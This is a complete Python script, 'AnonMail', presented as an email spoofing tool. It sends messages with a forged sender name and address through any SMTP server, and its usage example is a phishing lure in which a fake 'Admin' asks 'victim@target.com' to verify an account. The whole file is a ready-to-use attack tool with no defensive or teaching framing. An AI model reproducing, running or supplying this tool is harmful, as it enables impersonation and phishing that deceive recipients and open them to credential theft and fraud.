# AnonMail - Anonymous Email Spoofing Tool
# Coded by KRISHNA

import smtplib
from email.mime.text import MIMEText
import sys

BANNER = r"""
    ___              _ __  __       _ _ 
   / _ \ _ __   __ _| |  \/  | __ _(_) |
  | | | | '_ \ / _` | | |\/| |/ _` | | |
  | |_| | | | | (_| | | |  | | (_| | | |
   \___/|_| |_|\__,_|_|_|  |_|\__,_|_|_|
     AnonMail - Spoofed Email Sender
             Coded by KRISHNA
"""

print(BANNER)

def send_email(smtp_server, smtp_port, sender_email, spoofed_name, spoofed_email, recipient_email, subject, message):
    try:
        msg = MIMEText(message)
        msg['Subject'] = subject
        msg['From'] = f"{spoofed_name} <{spoofed_email}>"
        msg['To'] = recipient_email

        print(f"[+] Connecting to SMTP server {smtp_server}:{smtp_port} ...")
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.sendmail(spoofed_email, [recipient_email], msg.as_string())
            print(f"[✔] Spoofed email sent to {recipient_email} from {spoofed_email}")
    except Exception as e:
        print(f"[✘] Error sending email: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 9:
        print("Usage:")
        print("python anonmail.py <smtp_server> <smtp_port> <sender_email> <spoofed_name> <spoofed_email> <recipient_email> <subject> <message>")
        print("Example:")
        print("python anonmail.py smtp.example.com 25 real@yourdomain.com 'Admin' spoofed@fake.com victim@target.com 'Notice' 'Please verify your account.'")
        sys.exit(1)

    _, smtp_server, smtp_port, sender_email, spoofed_name, spoofed_email, recipient_email, subject, message = sys.argv
    send_email(smtp_server, int(smtp_port), sender_email, spoofed_name, spoofed_email, recipient_email, subject, message)
